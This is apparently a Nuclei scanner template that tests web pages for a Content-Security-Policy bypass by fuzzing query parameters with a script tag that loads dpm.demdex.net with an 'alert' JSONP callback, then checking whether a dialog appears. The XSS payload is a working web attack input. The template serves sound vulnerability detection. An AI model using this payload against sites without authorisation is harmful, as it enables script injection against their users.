id: demdex-dpm-csp-bypass

info:
  name: Content-Security-Policy Bypass via Demdex DPM
  author: renniepak,DhiyaneshDK
  severity: medium
  reference:
    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
  metadata:
    verified: true
  tags: xss,csp-bypass,demdex-dpm

headless:
  - steps:
      - action: navigate
        args:
          url: "{{BaseURL}}"

      - action: waitdialog
        name: demdex_dpm_csp_xss
        args:
          max-duration: 5s

    payloads:
      injection:
        - '<script src="https://dpm.demdex.net/id?d_cb=alert"></script>'

    fuzzing:
      - part: query
        type: replace
        mode: single
        fuzz:
          - "{{url_encode(injection)}}"

    matchers:
      - type: dsl
        dsl:
          - "demdex_dpm_csp_xss == true" 